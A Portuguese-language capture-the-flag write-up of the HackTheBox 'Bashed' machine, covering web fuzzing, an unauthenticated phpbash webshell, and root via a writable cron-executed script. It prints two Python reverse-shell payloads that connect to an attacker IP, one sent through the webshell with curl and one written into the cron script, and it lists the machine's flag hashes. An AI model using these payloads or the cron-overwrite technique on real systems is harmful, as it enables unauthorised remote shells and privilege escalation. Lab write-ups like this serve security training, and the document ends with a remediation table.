---
title: "HTB — Bashed (Easy Linux): phpbash Webshell + Cron Root"
date: 2026-05-13 10:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, linux, webshell, ffuf, cron, privesc, easy]
---

**IP:** 10.129.34.106 | **Dificuldade:** Easy | **OS:** Linux (Ubuntu) | **Autor:** Arrexel

## Resumo

Máquina focada em fuzzing web e localização de arquivos expostos. O vetor de entrada é um webshell PHP (`phpbash`) deixado em um diretório de desenvolvimento. A escalada para root explora um cron job rodando como root que executa scripts Python de um diretório onde o usuário intermediário tem permissão de escrita.

| Flag | Hash |
|------|------|
| user.txt | `ab440b6b069d37839bcc6c121ec3d15a` |
| root.txt | `15a4aa589334918af374ad1582293393` |

---

## 1. Reconhecimento

```bash
nmap -sV -sC -T4 -Pn 10.129.34.106 -oA nmap/initial
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

---

## 2. Enumeração Web

```bash
ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://10.129.34.106/FUZZ -mc 200,301,302,403
```

```
dev             [301]  ← ALVO
uploads         [301]
php             [301]
```

O diretório `/dev` contém uma cópia funcional do **phpbash** — webshell interativo sem autenticação:

```bash
curl -s http://10.129.34.106/dev/phpbash.php --data "cmd=whoami"
# www-data
```

---

## 3. Foothold — Reverse Shell (www-data)

```bash
curl --data-urlencode "cmd=python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"10.10.15.8\",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call([\"/bin/bash\",\"-i\"])'" \
http://10.129.34.106/dev/phpbash.php
```

```bash
cat /home/arrexel/user.txt
# ab440b6b069d37839bcc6c121ec3d15a
```

---

## 4. Escalada de Privilégios

### www-data → scriptmanager (sudo NOPASSWD)

```bash
sudo -l
# (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### scriptmanager → root (cron job)

```bash
sudo -u scriptmanager ls -la /scripts/
# -rw-r--r-- 1 scriptmanager scriptmanager   58 Dec  4 2017 test.py
# -rw-r--r-- 1 root          root            12 May 13 14:14 test.txt  ← modificado por root
```

`test.txt` é atualizado a cada minuto pelo root via cron — logo `test.py` é executado como root. Basta sobrescrever o script:

```bash
sudo -u scriptmanager python -c "
open('/scripts/test.py','w').write(
  'import socket,subprocess,os\n'
  's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
  's.connect((\"10.10.15.8\",6666))\n'
  'os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\n'
  'subprocess.call([\"/bin/bash\",\"-i\"])\n'
)"
```

Após até 1 minuto o cron executa `test.py` como root → shell root recebida.

```bash
cat /root/root.txt
# 15a4aa589334918af374ad1582293393
```

---

## Diagrama

```
ffuf → /dev/phpbash.php (webshell sem auth)
  ↓ curl POST cmd= → www-data reverse shell
  ↓ sudo -u scriptmanager (NOPASSWD:ALL)
  ↓ /scripts/test.py sobrescrito → cron root executa
  ↓ root shell
```

---

## Lições Aprendidas

| Vulnerabilidade | Remediação |
|-----------------|------------|
| Webshell exposto em `/dev` sem autenticação | Nunca deixar ferramentas de dev em produção |
| sudo NOPASSWD para usuário de serviço | Restringir sudo ao mínimo necessário |
| Cron root executando scripts em dir editável | Scripts de root devem ter permissão 700 e pertencer ao root |
